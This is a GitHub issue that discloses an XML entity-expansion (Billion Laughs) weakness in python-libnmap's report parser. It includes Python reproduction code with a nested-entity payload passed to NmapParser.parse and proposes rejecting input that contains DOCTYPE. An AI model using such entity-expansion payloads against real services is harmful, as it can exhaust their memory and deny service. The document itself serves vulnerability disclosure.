## Description

![@prodigysml](https://avatars.githubusercontent.com/u/16996819?u=8ac045207384ce660425a4fdded4a836e20988a2&v=4&size=48)[prodigysml](https://github.com/prodigysml)opened [on Feb 1, 2018](https://github.com/savon-noir/python-libnmap/issues/87#issue-293399700)
# Issue

Libnmap is vulnerable to XML Bomb attacks using the following:

<https://en.wikipedia.org/wiki/Billion_laughs_attack>

# Where the Issue Occurred

The issue occurs within parsing of XML reports for nmap. The exact line where the vulnerable parsing occurs is given below:

[python-libnmap/libnmap/parser.py](https://github.com/savon-noir/python-libnmap/blob/9cf3a541c50dc5f34c9b5e6c7f902e52b5afc527/libnmap/parser.py#L90)

Line 90
in
[9cf3a54](/savon-noir/python-libnmap/commit/9cf3a541c50dc5f34c9b5e6c7f902e52b5afc527)

|  | root = ET.fromstring(nmap\_data) |
| --- | --- |

# Reproduction steps

Run the following code:

```
ty = NmapParser()

payload = """
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ELEMENT lolz (#PCDATA)>
 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz><hello>&lol3;</hello></lolz>
"""

ty.parse(payload)
```
# Remediation

Python does not contain any fixes for this vulnerability, but that doesn't mean it can't be fixed. Searching for the word DOCTYPE, prior to parsing, and raising an exception should patch the issue.
